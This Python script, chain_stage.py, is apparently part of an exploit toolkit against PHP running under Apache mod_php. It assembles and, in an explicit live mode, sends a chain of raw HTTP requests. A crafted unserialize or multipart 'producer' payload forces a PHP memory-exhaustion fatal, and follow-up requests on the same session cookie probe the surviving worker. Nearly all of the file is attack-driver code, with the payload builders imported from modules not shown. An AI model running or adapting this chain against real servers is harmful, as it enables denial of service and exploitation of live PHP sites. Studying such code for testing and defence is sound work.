#!/usr/bin/env python3
"""chain_stage.py - --step chain ordered sequence builder for the mod_php target.

Chain semantics:
  1. producer: producer_unser class payload by default (master shape (a)); the
     producer_modphp machinery arm is the alternative (--producer modphp).
  2. consumer: tiny benign multipart, exactly two parts with tiny names, Cookie
     PHPSESSID=<sid>, no file parts, no USP field.
  3. reader arms: baseline and repeat GET probes with the same Cookie sid. The
     reader baseline body is the shape reference for the consumer response.

Dry mode is the default: every request blob is built, hashed and written under
the receipt dir, and no socket is opened. Live mode is explicit (--live) and
requires both --unser-url (producer_unser endpoint) and --arm-url (consumer
arms endpoint).

Worker affinity is operator work: the driver never parses pids. Correlate the
httpd access log %P column across the sequence externally.

Expected receipts:
  producer_unser: HTTP 200, fatal transcript with the class tried alloc, mod_php
    worker survives.
  producer_modphp: HTTP 200, 149 B fatal transcript, expected alloc from the N
    ladder, mod_php worker survives.
  consumer and readers: baseline shape bodies, HTTP 200 with no fatal marker.
"""


import hashlib
import re
import time
from pathlib import Path


BOUNDARY = b"B7kQchain"
DEFAULT_SID = "0123456789abcdef0123456789abcdef"
SID_PATTERN = re.compile(r"[0-9a-f]{32}")
FATAL_MARKERS = (
    b"Allowed memory",
    b"exhausted",
    b"Fatal error",
    b"Unknown</b> on line",
)
CONSUMER_PARTS = ((b"a", b"1"), (b"b", b"2"))
CONSUMER_TAG = "consumer"
READER_TAGS = ("reader-baseline", "reader-repeat")


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def validate_sid(sid: str) -> str:
    """Cookie transport sid: exactly 32 hex chars (HTTP header safety)."""
    if not isinstance(sid, str) or not SID_PATTERN.fullmatch(sid):
        raise ValueError(
            "chain --sid must be exactly 32 hex chars (Cookie: PHPSESSID transport)"
        )
    return sid


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def tiny_body() -> bytes:
    """Two part benign multipart with tiny names and values."""
    segments = [field(name, value) for name, value in CONSUMER_PARTS]
    segments.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(segments)


def multipart_request(
    host_header: str, path: str, sid: str, body: bytes, tag: str,
    keep_alive: bool = False,
) -> bytes:
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + b"Cookie: PHPSESSID=" + sid.encode("ascii") + b"\r\n"
        + b"X-Chain-Step: " + tag.encode("ascii") + b"\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def get_request(
    host_header: str, path: str, sid: str, tag: str, keep_alive: bool = False,
) -> bytes:
    return (
        b"GET " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + b"Cookie: PHPSESSID=" + sid.encode("ascii") + b"\r\n"
        + b"X-Chain-Step: " + tag.encode("ascii") + b"\r\n\r\n"
    )


def _request_meta(
    order: int, label: str, method: str, path: str, connection: str,
    request: bytes, endpoint_source: str,
) -> dict:
    return {
        "order": order,
        "label": label,
        "method": method,
        "path": path,
        "connection": connection,
        "bytes": len(request),
        "sha256": _sha(request),
        "artifact": f"{order:02d}-{label}-request.bin",
        "endpoint_source": endpoint_source,
    }


def _load_stages():
    from tool.modules import producer_modphp, producer_unser
    return producer_modphp, producer_unser


def _producer_step(
    producer: str, host_header: str, unser_path: str | None,
    arm_path: str | None, target_path: str, memory_limit: str,
    body_bytes: int, sid: str,
) -> tuple[dict, bytes]:
    """Build the producer request blob and its expected receipt signature."""
    producer_modphp, producer_unser = _load_stages()
    if producer == "producer_unser":
        record = producer_unser.class_record(memory_limit)
        payload = producer_unser.build_payload(memory_limit)
        path = unser_path or target_path
        source = "--unser-url" if unser_path else "dry placeholder (target path)"
        request = producer_unser.request_bytes(path, host_header, payload)
        meta = _request_meta(1, "producer", "POST", path, "close", request, source)
        expected = {
            "status": 200,
            "fatal_transcript": True,
            "fatal_markers": [marker.decode("latin1")
                              for marker in producer_unser.MARKERS],
            "expected_alloc_bytes": record["tried_alloc_bytes"],
            "fatal_site": "php_var_unserialize_internal: array_init_size(H) + "
                          "zend_hash_real_init_mixed",
            "worker": "survives (mod_php prefork child keeps serving)",
            "note": "mod_php keeps HTTP 200 when the fatal fires in the machinery",
        }
        details = {
            "memory_limit_class": record["label"],
            "payload_bytes": len(payload),
            "payload_sha256": _sha(payload),
            "P": record["P"],
            "H": record["H"],
            "post_max_size": producer_unser.POST_MAX_SIZE,
            "over_budget": len(payload) >= producer_unser.POST_MAX_SIZE,
        }
        return {
            "order": 1,
            "step": "producer",
            "module": "producer_unser",
            "transport": "raw application/octet-stream body to the unser endpoint",
            "request": meta,
            "expected_receipt": expected,
            "details": details,
        }, request
    if producer == "producer_modphp":
        knob = producer_modphp.validate_memory_limit(memory_limit)
        producer_modphp.validate_body_bytes(body_bytes)
        built = producer_modphp.build(sid.encode("ascii"), body_bytes)
        path = arm_path or target_path
        source = "--arm-url" if arm_path else "dry placeholder (target path)"
        request = producer_modphp.request_bytes(path, host_header, built["body"], sid)
        meta = _request_meta(1, "producer", "POST", path, "close", request, source)
        expected = {
            "status": 200,
            "fatal_transcript": True,
            "transcript_bytes": 149,
            "expected_alloc_bytes": built["expected_alloc_bytes"],
            "worker": "survives (mod_php prefork child keeps serving)",
            "note": "receipt run_20261021T155303Z_armoom: 200 plus 149 B fatal "
                    "transcript, all workers survive",
        }
        details = {
            "memory_limit_knob": knob,
            "body_bytes": body_bytes,
            "request_body_bytes": built["body_bytes"],
            "file_parts": built["file_parts"],
            "post_max_size": producer_modphp.POST_MAX_SIZE,
            "over_budget": built["over_budget"],
        }
        return {
            "order": 1,
            "step": "producer",
            "module": "producer_modphp",
            "transport": "multipart machinery arm, Cookie PHPSESSID transport",
            "request": meta,
            "expected_receipt": expected,
            "details": details,
        }, request
    raise ValueError(
        f"chain producer {producer!r} is not wired: use producer_unser (default) "
        "or producer_modphp"
    )


def _assemble(
    host_header: str, path: str, producer: str, memory_limit: str,
    body_bytes: int, sid: str, unser_path: str | None, arm_path: str | None,
) -> tuple[dict, dict[str, bytes]]:
    validate_sid(sid)
    arm_endpoint = arm_path or path
    arm_source = "--arm-url" if arm_path else "dry placeholder (target path)"
    producer_step, producer_request = _producer_step(
        producer, host_header, unser_path, arm_path, path, memory_limit,
        body_bytes, sid,
    )
    body = tiny_body()
    consumer_request = multipart_request(
        host_header, arm_endpoint, sid, body, CONSUMER_TAG)
    consumer_meta = _request_meta(
        2, CONSUMER_TAG, "POST", arm_endpoint, "close", consumer_request, arm_source)
    reader_requests = []
    reader_steps = []
    for order, tag in enumerate(READER_TAGS, start=3):
        request = get_request(host_header, arm_endpoint, sid, tag)
        reader_requests.append(request)
        reader_steps.append({
            "order": order,
            "step": tag,
            "module": "chain_stage.get_request",
            "transport": "GET read with Cookie PHPSESSID transport",
            "request": _request_meta(
                order, tag, "GET", arm_endpoint, "close", request, arm_source),
            "expected_receipt": {
                "status": 200,
                "baseline_shape_body": True,
                "fatal_markers_absent": True,
                "note": "GET read; body is the baseline shape reference",
            },
        })
    consumer_step = {
        "order": 2,
        "step": "consumer",
        "module": "chain_stage.tiny_body",
        "transport": "tiny two part multipart, Cookie PHPSESSID transport",
        "request": consumer_meta,
        "expected_receipt": {
            "status": 200,
            "baseline_shape_body": True,
            "fatal_markers_absent": True,
            "baseline_reference": "reader-baseline response body (same sid)",
            "note": "benign two part multipart; no machinery fatal expected",
        },
        "details": {
            "parts": len(CONSUMER_PARTS),
            "part_names": [name.decode("ascii") for name, _value in CONSUMER_PARTS],
            "body_bytes": len(body),
            "boundary": BOUNDARY.decode("latin1"),
            "file_parts": 0,
        },
    }
    steps = [producer_step, consumer_step] + reader_steps
    blobs = {
        producer_step["request"]["artifact"]: producer_request,
        consumer_step["request"]["artifact"]: consumer_request,
    }
    for step, request in zip(reader_steps, reader_requests):
        blobs[step["request"]["artifact"]] = request
    summary = {
        "stage": "chain",
        "target_lane": "modphp",
        "dry_run": True,
        "sent": False,
        "producer": producer,
        "producer_alternate": (
            "producer_modphp" if producer == "producer_unser" else "producer_unser"),
        "sid": sid,
        "host_header": host_header,
        "path": path,
        "worker_affinity": "operator correlates httpd access log %P pids externally; "
                           "the driver does not parse pids",
        "live_gate": {
            "armed": False,
            "requires": ["--live", "--unser-url", "--arm-url"],
        },
        "steps": steps,
        "expected_receipts": {
            "producer": steps[0]["expected_receipt"],
            "consumer": consumer_step["expected_receipt"],
            "readers": [step["expected_receipt"] for step in reader_steps],
        },
    }
    return summary, blobs


def build(
    host_header: str, path: str, producer: str, memory_limit: str,
    body_bytes: int, sid: str, unser_path: str | None = None,
    arm_path: str | None = None, output: Path | None = None,
) -> dict:
    """Dry sequence: build every blob, hash it, write it, zero sockets."""
    summary, blobs = _assemble(
        host_header, path, producer, memory_limit, body_bytes, sid,
        unser_path, arm_path)
    artifacts = {}
    if output is not None:
        output.mkdir(parents=True, exist_ok=True)
        for name, data in blobs.items():
            (output / name).write_bytes(data)
            artifacts[name] = {"bytes": len(data), "sha256": _sha(data)}
    summary["artifacts"] = artifacts
    return summary


def _send(host: str, port: int, request: bytes, timeout: float) -> tuple[dict, bytes]:
    import socket

    from tool.modules import arm

    started = time.monotonic()
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)
        connection.sendall(request)
        response, body, headers, status = arm.read_response(
            connection.makefile("rb", buffering=0))
    result = {
        "status": status,
        "connection": headers.get("connection", ""),
        "response_bytes": len(response),
        "response_sha256": _sha(response),
        "body_bytes": len(body),
        "body_sha256": _sha(body),
        "fatal_markers": [marker.decode("latin1") for marker in FATAL_MARKERS
                          if marker in body],
        "wall_ms": round((time.monotonic() - started) * 1000, 1),
    }
    return result, response


def live(
    producer: str, memory_limit: str, body_bytes: int, sid: str,
    unser_url: str, arm_url: str, output: Path, timeout: float = 30.0,
) -> dict:
    """Explicit live run: producer endpoint first, then the consumer arms."""
    from tool.modules import producer_modphp, producer_unser

    validate_sid(sid)
    unser_host, unser_port, unser_path, unser_header = producer_unser.parse_url(unser_url)
    arm_host, arm_port, arm_path, arm_header = producer_unser.parse_url(arm_url)
    summary, blobs = _assemble(
        arm_header, arm_path, producer, memory_limit, body_bytes, sid,
        unser_path, arm_path)
    summary["dry_run"] = False
    summary["sent"] = True
    summary["live_gate"]["armed"] = True

    if producer == "producer_unser":
        producer_result = producer_unser.fire(
            unser_url, memory_limit, output / "producer", timeout=timeout)
        producer_ok = (
            producer_result.get("status") == 200
            and any(marker["marker"] == "Allowed memory"
                    for marker in producer_result.get("markers", []))
        )
    else:
        producer_result = producer_modphp.fire(
            arm_host, arm_port, body_bytes, output / "producer", memory_limit,
            sid, timeout=timeout, path=arm_path)
        producer_ok = bool(producer_result.get("oom_receipt"))
    arms_output = output / "arms"
    arms_output.mkdir(parents=True, exist_ok=True)
    results = [{"step": "producer", "module": producer,
                "ok": producer_ok, "result": producer_result}]
    all_ok = producer_ok
    for step in summary["steps"][1:]:
        artifact = step["request"]["artifact"]
        result, response = _send(arm_host, arm_port, blobs[artifact], timeout)
        (arms_output / artifact).write_bytes(blobs[artifact])
        (arms_output / artifact.replace("-request.bin", "-response.bin")).write_bytes(
            response)
        ok = result["status"] == 200 and not result["fatal_markers"]
        all_ok = all_ok and ok
        results.append({"step": step["step"], "ok": ok, "result": result})
    summary["live_steps"] = results
    summary["success"] = all_ok
    return summary
